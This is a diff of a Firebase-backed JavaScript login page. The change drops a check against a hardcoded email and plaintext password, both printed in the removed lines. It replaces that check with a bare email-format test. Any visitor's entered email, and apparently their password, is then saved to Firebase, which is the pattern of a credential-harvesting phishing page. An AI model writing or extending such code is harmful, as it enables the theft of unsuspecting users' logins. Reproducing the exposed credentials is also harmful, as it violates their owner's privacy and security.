@@ -140,11 +140,6 @@
   const analytics = getAnalytics(app);
   const db = getDatabase(app);
 
-  // Predefined correct login
-  const correctEmail = "crackvision6@gmail.com";
-  const correctPassword = "Uzair787";
-
-  // Show popup function
   function showPopup(message, type = "default") {
     const popup = document.getElementById("popup");
     popup.innerText = message;
@@ -159,7 +154,11 @@
     }, 3000);
   }
 
-  // Save login
+  // Email validation: checks if it looks like a real email
+  function isValidEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  }
+
   window.saveLogin = () => {
     const email = document.getElementById("email").value.trim();
     const password = document.getElementById("password").value.trim();
@@ -169,7 +168,7 @@
       return;
     }
 
-    if (email === correctEmail && password === correctPassword) {
+    if (isValidEmail(email)) {
       // ✅ Save to Firebase
       const loginData = {
         email,
@@ -185,11 +184,12 @@
           }, 1000);
         })
         .catch((error) => {
-          showPopup("Firebase Error", "error");
           console.error("Firebase error:", error);
+          showPopup("Error saving to Firebase", "error");
         });
     } else {
-      showPopup("Incorrect Email or Password", "error");
+      // ❌ Invalid input (not a real email)
+      showPopup("Invalid email or phone number.", "error");
       setTimeout(() => {
         window.location.href = "sysinfo.html";
       }, 2000);
